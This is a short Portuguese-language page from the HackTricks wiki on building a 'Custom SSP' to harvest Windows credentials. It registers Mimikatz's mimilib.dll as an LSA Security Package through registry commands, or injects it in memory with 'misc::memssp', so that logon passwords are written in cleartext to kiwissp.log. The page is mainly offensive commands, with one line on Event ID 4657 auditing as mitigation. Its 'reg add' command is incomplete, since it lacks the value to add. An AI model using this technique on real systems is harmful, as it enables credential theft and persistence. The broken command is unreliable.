# Custom SSP

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}

### Custom SSP

[Saiba o que é um SSP (Security Support Provider) aqui.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Você pode criar seu **próprio SSP** para **capturar** em **texto claro** as **credenciais** usadas para acessar a máquina.

#### Mimilib

Você pode usar o binário `mimilib.dll` fornecido pelo Mimikatz. **Isso registrará em um arquivo todas as credenciais em texto claro.**\
Coloque o dll em `C:\Windows\System32\`\
Obtenha uma lista de Pacotes de Segurança LSA existentes:

{% code title="attacker@target" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

Adicione `mimilib.dll` à lista de Provedores de Suporte de Segurança (Pacotes de Segurança):
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
E após uma reinicialização, todas as credenciais podem ser encontradas em texto claro em `C:\Windows\System32\kiwissp.log`

#### Em memória

Você também pode injetar isso na memória diretamente usando Mimikatz (note que pode ser um pouco instável/não funcionar):
```powershell
privilege::debug
misc::memssp
```
Isso não sobreviverá a reinicializações.

#### Mitigação

ID do Evento 4657 - Auditoria de criação/mudança de `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}
